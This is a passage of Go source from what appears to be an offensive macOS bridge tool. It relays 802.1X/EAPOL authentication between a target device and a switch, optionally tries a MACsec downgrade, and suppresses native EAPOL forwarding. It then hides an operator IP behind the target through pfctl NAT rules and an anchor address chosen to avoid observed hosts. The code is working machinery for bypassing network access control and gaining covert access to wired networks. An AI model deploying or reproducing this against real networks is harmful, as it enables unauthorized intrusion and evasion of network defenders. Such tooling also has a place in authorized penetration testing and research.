	session.VLANID = b.targetID.VLANID
	if len(b.targetID.AuthenticatorMAC) > 0 {
		session.AuthenticatorMAC = append(net.HardwareAddr(nil), b.targetID.AuthenticatorMAC...)
	}
	b.eapolSession = session
	b.eapolPassthrough = false
	b.state = BridgeStateEAPOLRelaying
	b.mu.Unlock()

	eapolCtx, eapolCancel := context.WithCancel(ctx)
	b.mu.Lock()
	b.cancelEAPOL = eapolCancel
	b.mu.Unlock()

	relay := eapol.NewRelay(b.ifaceA, b.ifaceB, session, logFunc)

	b.mu.Lock()
	shouldDowngrade := b.macsecDowngrade
	b.eapolRelay = relay
	b.mu.Unlock()

	if shouldDowngrade {
		b.mu.Lock()
		b.state = BridgeStateDowngrading
		b.mu.Unlock()
		relay.EnableDowngrade()
	}

	if err := stealth.SuppressNativeEAPOL(b.name, b.ifaceA, b.ifaceB); err != nil {
		logFunc(fmt.Sprintf("[W][802.1X] Could not suppress native bridge EAPOL forwarding: %v", err))
		logFunc("[W][802.1X] Relay will still inspect frames, but duplicate native EAPOL forwarding may occur.")
	} else {
		logFunc("[+][802.1X] Native bridge EAPOL forwarding suppressed; relay owns 802.1X path.")
	}

	// Start the relay in a goroutine (it runs perpetually for re-auth).
	go func() {
		if err := relay.Start(eapolCtx); err != nil {
			logFunc(fmt.Sprintf("[*][802.1X] EAPOL relay error: %v", err))
		}
	}()

	// Wait for the initial authentication result.
	logFunc("[*][802.1X] Waiting for EAP authentication to complete...")
	authResult, err := relay.WaitForAuth(eapolCtx)
	if err != nil {
		if err == context.Canceled {
			return
		}
		logFunc(fmt.Sprintf("[*][802.1X] Authentication wait error: %v", err))
		b.mu.Lock()
		b.state = BridgeStateEAPOLFailed
		b.mu.Unlock()
		return
	}

	if authResult.Success {
		logFunc(fmt.Sprintf("[+][802.1X] Authentication successful via %s", authResult.Method))
		logFunc("[*][802.1X] Port is now AUTHORIZED. Proceeding to NAT setup.")
		b.mu.Lock()
		b.state = BridgeStateEAPOLAuthenticated
		b.mu.Unlock()
	} else {
		logFunc("[!][802.1X] Authentication FAILED.")

		b.mu.Lock()
		downgradeEnabled := b.macsecDowngrade
		b.mu.Unlock()

		if authResult.MACsecDetected && downgradeEnabled {
			logFunc("[!][MACSEC] Downgrade was enabled, but authentication still failed. Switch may require MACsec.")
		} else if authResult.MACsecDetected {
			logFunc("[!][MACSEC] MACsec was detected. Downgrade is disabled, so traffic was not modified.")
		} else {
			logFunc("[!][802.1X] Authentication rejected. Check device credentials.")
		}
		b.mu.Lock()
		b.state = BridgeStateEAPOLFailed
		b.mu.Unlock()
		return
	}

	// The relay goroutine continues running to handle re-authentication.
	logFunc("[*][802.1X] EAPOL relay remains active for periodic re-authentication.")
}

// StopEAPOLRelay terminates the active relay and restores the bridge to L2 mode.
func (b *Bridge) StopEAPOLRelay(logFunc func(string)) {
	b.mu.Lock()
	cancel := b.cancelEAPOL
	b.mu.Unlock()

	if cancel != nil {
		cancel()
		b.mu.Lock()
		b.cancelEAPOL = nil
		b.eapolSession = nil
		b.eapolRelay = nil
		b.eapolPassthrough = false
		// Return back to Ready state if we were stuck Relaying or even if Authenticated.
		if b.state == BridgeStateEAPOLRelaying || b.state == BridgeStateEAPOLAuthenticated || b.state == BridgeStateDowngrading || b.state == BridgeStateEAPOLFailed {
			b.state = BridgeStateReady
		}
		b.mu.Unlock()
		if err := stealth.ResetBridgeRules(b.name); err != nil {
			logFunc(fmt.Sprintf("[W][802.1X] Failed to reset bridge rules after relay stop: %v", err))
		}
		b.installBridgeSafety(nil, logFunc)
		logFunc("[*][802.1X] EAPOL relay stopped. Bridge returned to L2 passthrough (Ready).")
	} else {
		logFunc("[!][802.1X] No EAPOL relay is currently active.")
	}
}

// setupNATProxy configures the stealth NAT proxy on the bridge.
// This is called after 802.1X auth succeeds (or immediately if no 802.1X).
// Note: IPv6 autoconf is already suppressed in Phase 1 (runStealth).
func (b *Bridge) setupNATProxy(id *stealth.TargetIdentity, logFunc func(string)) {
	if id == nil || len(id.IP) == 0 {
		logFunc("[!] Cannot setup NAT: target IP is not known yet. Layer 2 passthrough remains active.")
		return
	}

	anchor, err := chooseNATAnchor(id)
	if err != nil {
		logFunc(fmt.Sprintf("[!] Cannot setup NAT: %v", err))
		return
	}

	if anchor.SameSubnet {
		logFunc(fmt.Sprintf("[*] Anchoring operator IP on learned subnet: %s/%s (%s)", anchor.IP, anchor.Netmask, anchor.Evidence))
	} else {
		logFunc(fmt.Sprintf("[*] Anchoring orthogonal Stealth Proxy IP: %s/%s (%s)", anchor.IP, anchor.Netmask, anchor.Evidence))
	}
	runCmd("ifconfig", b.name, anchor.IP, "netmask", anchor.Netmask, "up")

	if out, err := runCmd("sysctl", "-w", "net.inet.ip.forwarding=1"); err != nil {
		logFunc(fmt.Sprintf("[!] IPv4 forwarding sysctl failed; NAT may not route correctly: %v (%s)", err, strings.TrimSpace(out)))
		if _, delErr := runCmd("ifconfig", b.name, "delete", anchor.IP); delErr != nil {
			logFunc(fmt.Sprintf("[!] Failed to remove failed NAT anchor IP %s: %v", anchor.IP, delErr))
		}
		return
	}

	logFunc("[*] Activating Stealth NAT proxy on bridge...")
	rule := stealth.PFRule{
		Interface: b.name,
		HiddenIP:  anchor.IP,
		TargetIP:  id.IP.String(),
	}
	err = stealth.EnableNAT(rule)
	if err != nil {
		logFunc(fmt.Sprintf("[!] ERROR injecting NAT: %v", err))
		if _, delErr := runCmd("ifconfig", b.name, "delete", anchor.IP); delErr != nil {
			logFunc(fmt.Sprintf("[!] Failed to remove failed NAT anchor IP %s: %v", anchor.IP, delErr))
		}
		b.restoreIPv4Forwarding(logFunc)
		b.mu.Lock()
		b.natHiddenIP = ""
		b.natHiddenNetmask = ""
		b.natAnchorMode = ""
		b.natAnchorEvidence = ""
		b.isNATActive = false
		b.mu.Unlock()
		return
	}
	logFunc("[+] pfctl rules active. Stealth proxy seamlessly engaged.")

	if network, mask, err := b.installNATRoute(id, logFunc); err != nil {
		logFunc(fmt.Sprintf("[W] NAT route not installed; operator traffic may still use another interface: %v", err))
		logFunc(fmt.Sprintf("[W] Check with: route -n get <host>  (expected interface: %s)", b.name))
	} else if network != "" {
		logFunc(fmt.Sprintf("[+] NAT route installed: %s/%s via %s", network, mask, b.name))
	}

	b.mu.Lock()
	b.natHiddenIP = anchor.IP
	b.natHiddenNetmask = anchor.Netmask
	b.natAnchorMode = anchor.Mode
	b.natAnchorEvidence = anchor.Evidence
	b.isNATActive = true
	b.mu.Unlock()

	// Launch a background EAPOL watcher on the switch port. Some switches have
	// very long MAB fallback timers (60-90s). If 802.1X frames appear after
	// NAT setup, record that passively and leave kernel bridge forwarding intact.
	b.mu.Lock()
	needsWatcher := b.eapolSession == nil
	b.mu.Unlock()
	if needsWatcher {
		go b.backgroundEAPOLWatch(logFunc)
	}
}

// backgroundEAPOLWatch monitors the switch port for late-arriving EAPOL frames.
// This catches switches with long MAB fallback timers that send EAPOL-Request/Identity
// after our initial detection timeout expired. It observes only; manual relay is
// an explicit operator action.
func (b *Bridge) backgroundEAPOLWatch(logFunc func(string)) {
	// Build a context that we can cancel independently, AND that dies
	// when Destroy() fires cancelCtx.
	ctx, cancel := context.WithCancel(b.ctx)
	defer cancel()

	detector := eapol.NewDetector(b.ifaceB)
	// Long poll — listen for up to 5 minutes for late 802.1X.
	result, err := detector.Detect(ctx, 5*time.Minute, func(msg string) {
		// Only log EAPOL-related messages to avoid spamming recon log.
		if strings.Contains(msg, "EAPOL") || strings.Contains(msg, "802.1X") {
			logFunc(msg)
		}
	}, false)

	if err != nil || result == nil || !result.Detected {
		return // No late EAPOL — network is not 802.1X
	}

	logFunc("[+][802.1X] Late EAPOL observed after NAT setup. Transparent L2 forwarding remains active.")

	b.mu.Lock()
	if b.targetID != nil {
		b.targetID.EAPOLDetected = true
		if len(result.AuthenticatorMAC) > 0 && !macEqual(result.AuthenticatorMAC, b.targetID.MAC) {
			b.targetID.AuthenticatorMAC = append(net.HardwareAddr(nil), result.AuthenticatorMAC...)
		}
	}
	if b.state == BridgeStateReady || b.state == BridgeStateStealthActive {
		b.state = BridgeStateEAPOLDetected
	}
	b.mu.Unlock()
}

// Name returns the kernel name of the bridge (e.g. "bridge0").
func (b *Bridge) Name() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.name
}

// State returns the current bridge state.
func (b *Bridge) State() BridgeState {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.state
}

// AppendLog appends a message to the bridge's recon log.
// This allows external callers (e.g., TUI action modes) to inject log entries.
func (b *Bridge) AppendLog(msg string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.reconLogs = append(b.reconLogs, msg)
}

// IfaceA returns the name of the first member interface.
func (b *Bridge) IfaceA() string {
	return b.ifaceA
}

// IfaceB returns the name of the second member interface.
func (b *Bridge) IfaceB() string {
	return b.ifaceB
}

// Status returns a snapshot of the bridge state.
func (b *Bridge) Status() BridgeStatus {
	b.mu.Lock()
	name := b.name
	session := b.eapolSession
	status := BridgeStatus{
		Name:              name,
		IfaceA:            b.ifaceA,
		IfaceB:            b.ifaceB,
		State:             b.state,
		TargetID:          cloneTargetIdentity(b.targetID),
		ReconLogs:         append([]string(nil), b.reconLogs...), // copy so UI slice is safe
		EAPOLPassthrough:  b.eapolPassthrough,
		CaptureFiles:      append([]string(nil), b.capturePaths...),
		NATActive:         b.isNATActive,
		NATHiddenIP:       b.natHiddenIP,
		NATHiddenNetmask:  b.natHiddenNetmask,
		NATAnchorMode:     b.natAnchorMode,
		NATAnchorEvidence: b.natAnchorEvidence,
		NATRouteNetwork:   b.natRouteNetwork,
		NATRouteNetmask:   b.natRouteNetmask,
	}
	b.mu.Unlock()

	// Populate 802.1X status from the active session.
	// Done outside b.mu to avoid nested lock (b.mu → session.mu).
	if session != nil {
		snap := session.Snapshot()
		status.EAPOLActive = snap.State == eapol.StateRelaying || snap.State == eapol.StateAuthenticated
		status.EAPOLAuthenticated = snap.State == eapol.StateAuthenticated
		status.EAPMethod = string(snap.Method)
		status.EAPOLFramesRelayed = snap.FramesRelayed
		status.MACsecDetected = snap.MACsecDetected
	}

	return status
}

// Destroy tears down the bridge, removes members, and restores IP forwarding.
func (b *Bridge) Destroy() error {
	// Snapshot cancel functions to avoid deadlocks with goroutines
	// (like the sniffer) that attempt to log and acquire mu on cancellation.
	b.mu.Lock()
	cancelCtx := b.cancelCtx
	cancelEAPOL := b.cancelEAPOL
	cancelListen := b.cancelListen
	b.mu.Unlock()

	if cancelCtx != nil {
		cancelCtx()
	}
	if cancelEAPOL != nil {
		cancelEAPOL()
	}
	if cancelListen != nil {
		cancelListen()
	}

	b.mu.Lock()
	defer b.mu.Unlock()
	return b.destroy()
}

// destroy is the internal teardown (must hold mu).
func (b *Bridge) destroy() error {
	if b.name == "" {
		return nil
	}

	if b.isStealth {
		stealth.DisableNAT()
	}

	var errs []string

	// On macOS, destroying the bridge interface automatically unbinds all members.
	// This reduces 4 synchronous commands down to 1, eliminating TUI freezing.
	if _, err := runCmd("ifconfig", b.name, "destroy"); err != nil {
		errs = append(errs, fmt.Sprintf("destroying %s: %v", b.name, err))
	}

	// Restore original IP forwarding setting.
	if b.origForwarding != "" {
		val := strings.TrimSpace(b.origForwarding)
		_, _ = runCmd("sysctl", "-w", "net.inet.ip.forwarding="+val)
	}
	if b.origIPv6Fwd != "" {
		val := strings.TrimSpace(b.origIPv6Fwd)
		_, _ = runCmd("sysctl", "-w", "net.inet6.ip6.forwarding="+val)
	}
	b.removeNATRoute(nil)
	stealth.RestoreL2Services()

	b.state = BridgeStateDown

	if len(errs) > 0 {
		return fmt.Errorf("teardown errors: %s", strings.Join(errs, "; "))
	}
	return nil
}

// CleanupStaleBridges finds and destroys any existing bridge interfaces
// and flushes stale pfctl NAT rules. Useful for recovering from a crashed session.
func CleanupStaleBridges() ([]string, error) {
	out, err := runCmd("ifconfig", "-l")
	if err != nil {
		return nil, fmt.Errorf("listing interfaces: %w", err)
	}

	var cleaned []string
	for _, name := range strings.Fields(out) {
		if strings.HasPrefix(name, "bridge") {
			if _, err := runCmd("ifconfig", name, "destroy"); err == nil {
				cleaned = append(cleaned, name)
			}
		}
	}

	// Also flush the pfctl anchor to remove stale NAT/firewall rules.
	_ = stealth.DisableNAT()

	return cleaned, nil
}

// runCmd executes a command and returns its combined output.
func runCmd(name string, args ...string) (string, error) {
	const timeout = 5 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, name, args...)
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		return string(out), fmt.Errorf("%s %s timed out after %s", name, strings.Join(args, " "), timeout)
	}
	return string(out), err
}

// sysctl reads a sysctl value and returns just the value part.
// e.g. "net.inet.ip.forwarding: 0" → "0"
func sysctl(key string) (string, error) {
	out, err := runCmd("sysctl", key)
	if err != nil {
		return "", err
	}
	parts := strings.SplitN(strings.TrimSpace(out), ":", 2)
	if len(parts) == 2 {
		return strings.TrimSpace(parts[1]), nil
	}
	return strings.TrimSpace(out), nil
}

// isRFC1918_172 returns true if the IP string is in the 172.16.0.0/12 range.
// This correctly excludes public 172.0-15.x.x and 172.32+.x.x addresses.
func isRFC1918_172(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	_, cidr, _ := net.ParseCIDR("172.16.0.0/12")
	return cidr != nil && cidr.Contains(ip)
}

type natAnchorChoice struct {
	IP       string
	Netmask  string
	Mode     string
	Evidence string

	SameSubnet bool
}

func chooseNATAnchor(id *stealth.TargetIdentity) (natAnchorChoice, error) {
	if id == nil || id.IP.To4() == nil {
		return natAnchorChoice{}, fmt.Errorf("target IPv4 is unknown")
	}

	targetIP := id.IP.To4()
	mask, maskEvidence := observedNATMask(id)
	if len(mask) == net.IPv4len {
		if candidate := selectSameSubnetAnchor(targetIP, mask, observedNATAvoidList(id)); candidate != nil {
			return natAnchorChoice{
				IP:         candidate.String(),
				Netmask:    net.IP(mask).String(),
				Mode:       "same-subnet",
				Evidence:   fmt.Sprintf("%s %s/%s", maskEvidence, targetIP.Mask(mask), net.IP(mask)),
				SameSubnet: true,
			}, nil
		}
	}

	hiddenIP := orthogonalNATAnchor(targetIP)
	evidence := "no observed subnet mask; using off-subnet anchor"
	if len(mask) == net.IPv4len {
		evidence = "observed subnet had no free passive candidate; using off-subnet anchor"
	}
	return natAnchorChoice{
		IP:       hiddenIP,
		Netmask:  "255.255.255.0",
		Mode:     "orthogonal",
		Evidence: evidence,
	}, nil
}

func observedNATMask(id *stealth.TargetIdentity) (net.IPMask, string) {
	if id == nil {
		return nil, ""
	}
	if id.NetmaskObserved {
		if mask := normalizeIPv4Mask(id.Netmask, nil); len(mask) == net.IPv4len {
			return mask, "target DHCP mask"
		}
	}
	if id.NetworkMap != nil {
		snap := id.NetworkMap.Snapshot()
		if mask := normalizeIPv4Mask(snap.DHCP.Netmask, nil); len(mask) == net.IPv4len {
			return mask, "observed DHCP mask"
		}
	}
	return nil, ""
}

func orthogonalNATAnchor(targetIP net.IP) string {
	targetStr := targetIP.String()
	switch {
	case strings.HasPrefix(targetStr, "192.168."):
		return "10.254.254.10"
	case strings.HasPrefix(targetStr, "10."):
		return "172.16.254.10"
	case isRFC1918_172(targetStr):
		return "192.168.254.10"
	default:
		return "192.168.254.10"
	}
}

func observedNATAvoidList(id *stealth.TargetIdentity) map[uint32]bool {
	avoid := make(map[uint32]bool)
	add := func(ip net.IP) {
		ip4 := ip.To4()
		if ip4 == nil {
			return
		}
		avoid[binary.BigEndian.Uint32(ip4)] = true
	}

	add(id.IP)
	add(id.Gateway)

	if id.NetworkMap == nil {
		return avoid
	}

	snap := id.NetworkMap.Snapshot()
	add(snap.Gateway.IP)
	add(snap.DHCP.OfferedIP)
	add(snap.DHCP.ACKIP)
	add(snap.DHCP.ServerIP)
	add(snap.DHCP.RouterIP)
	add(snap.RADIUS.ClientIP)
	add(snap.RADIUS.ServerIP)
	add(snap.RADIUS.NASIPAddress)
	for _, host := range snap.Hosts {
		for _, ip := range host.IPs {
			add(ip)
		}
	}
	for _, conv := range snap.Conversations {
		add(conv.SrcIP)
		add(conv.DstIP)
	}
	return avoid
}

func selectSameSubnetAnchor(targetIP net.IP, mask net.IPMask, avoid map[uint32]bool) net.IP {
	target4 := targetIP.To4()
	if target4 == nil || len(mask) != net.IPv4len {
		return nil
	}

	target := binary.BigEndian.Uint32(target4)
	mask32 := binary.BigEndian.Uint32([]byte(mask))
	network := target & mask32
	broadcast := network | ^mask32
	if broadcast <= network+1 {
		return nil
	}

	if avoid == nil {
		avoid = make(map[uint32]bool)
	}
	avoid[network] = true
	avoid[broadcast] = true

	start := network + 1
	end := broadcast - 1
	candidates := make([]uint32, 0, 128)

	for offset := uint32(10); offset < 512; offset++ {
		if end < offset {
			break
		}
		candidate := end - offset + 1
		if candidate < start {
			break
		}
		candidates = append(candidates, candidate)
	}

	for delta := uint32(1); delta <= 64; delta++ {
		if target+delta <= end {
			candidates = append(candidates, target+delta)
		}
		if target >= start+delta {
			candidates = append(candidates, target-delta)
		}
	}

	span := end - start + 1
	for _, divisor := range []uint32{2, 3, 4, 5, 8, 13, 21, 34, 55, 89} {
		candidates = append(candidates, start+span/divisor)
	}

	for _, candidate := range candidates {
		if candidate < start || candidate > end || avoid[candidate] {
			continue
		}
		return uint32ToIP(candidate)
	}
	return nil
}

func uint32ToIP(value uint32) net.IP {
	ip := make(net.IP, net.IPv4len)
	binary.BigEndian.PutUint32(ip, value)
	return ip
}

func parseProtectedMACs(values ...string) []net.HardwareAddr {
	seen := make(map[string]bool)
	var macs []net.HardwareAddr
	for _, value := range values {
		value = strings.TrimSpace(value)
		if value == "" {
			continue
		}
		mac, err := net.ParseMAC(value)
		if err != nil || len(mac) != 6 {
			continue
		}
		key := strings.ToLower(mac.String())
		if seen[key] {
			continue
		}
		seen[key] = true
		macs = append(macs, append(net.HardwareAddr(nil), mac...))
	}
	return macs
}

func (b *Bridge) restoreIPv4Forwarding(logFunc func(string)) {
	if b.origForwarding == "" {
		return
	}
	val := strings.TrimSpace(b.origForwarding)
	if _, err := runCmd("sysctl", "-w", "net.inet.ip.forwarding="+val); err != nil && logFunc != nil {
		logFunc(fmt.Sprintf("[W] Failed to restore IPv4 forwarding to %s: %v", val, err))
	}
}

func (b *Bridge) installNATRoute(id *stealth.TargetIdentity, logFunc func(string)) (string, string, error) {
	if id == nil {
		return "", "", fmt.Errorf("missing target identity")
	}
	targetIP := id.IP.To4()
	if targetIP == nil {
		return "", "", fmt.Errorf("missing target IPv4")
	}
	mask := normalizeIPv4Mask(id.Netmask, targetIP.DefaultMask())
	if len(mask) != 4 {
		return "", "", fmt.Errorf("missing target netmask")
	}
	network := targetIP.Mask(mask).String()
	netmask := net.IP(mask).String()

	out, err := runCmd("route", "-n", "add", "-net", network, "-netmask", netmask, "-interface", b.name)
	if err != nil {
		if strings.Contains(strings.ToLower(out), "file exists") {
			return network, netmask, fmt.Errorf("route already exists for %s/%s; macOS may prefer the existing route", network, netmask)
		}
		return network, netmask, fmt.Errorf("route add failed: %v (%s)", err, strings.TrimSpace(out))
	}

	b.mu.Lock()
	b.natRouteNetwork = network
	b.natRouteNetmask = netmask
	b.natRouteInstalled = true
	b.mu.Unlock()

	return network, netmask, nil
}

func (b *Bridge) removeNATRoute(logFunc func(string)) {
	b.mu.Lock()
	network := b.natRouteNetwork
	netmask := b.natRouteNetmask
	installed := b.natRouteInstalled
	bridgeName := b.name
	b.natRouteNetwork = ""
	b.natRouteNetmask = ""
	b.natRouteInstalled = false
	b.mu.Unlock()

	if !installed || network == "" || netmask == "" {
		return
	}
	if out, err := runCmd("route", "-n", "delete", "-net", network, "-netmask", netmask); err != nil && logFunc != nil {
		logFunc(fmt.Sprintf("[W] Failed to remove NAT route %s/%s from %s: %v (%s)", network, netmask, bridgeName, err, strings.TrimSpace(out)))
	} else if logFunc != nil {
		logFunc(fmt.Sprintf("[+] Removed NAT route %s/%s from %s", network, netmask, bridgeName))
	}
}

func normalizeIPv4Mask(mask net.IPMask, fallback net.IPMask) net.IPMask {
	if len(mask) == net.IPv4len {
		return append(net.IPMask(nil), mask...)
	}
	if len(mask) == net.IPv6len {
		if v4 := net.IP(mask).To4(); v4 != nil {
			return net.IPMask(append(net.IP(nil), v4...))
		}
	}
	if len(fallback) == net.IPv4len {
		return append(net.IPMask(nil), fallback...)
	}
	return nil
}

func macEqual(a, b net.HardwareAddr) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func containsVLAN(vlans []uint16, vlan uint16) bool {
	for _, existing := range vlans {
		if existing == vlan {
			return true
		}
	}
	return false
}

func cloneTargetIdentity(id *stealth.TargetIdentity) *stealth.TargetIdentity {
	if id == nil {
		return nil
	}
	clone := *id
	clone.MAC = append(net.HardwareAddr(nil), id.MAC...)
	clone.IP = append(net.IP(nil), id.IP...)
	clone.Netmask = append(net.IPMask(nil), id.Netmask...)
	clone.Gateway = append(net.IP(nil), id.Gateway...)
	clone.AuthenticatorMAC = append(net.HardwareAddr(nil), id.AuthenticatorMAC...)
	clone.VLANs = append([]uint16(nil), id.VLANs...)
	return &clone
}
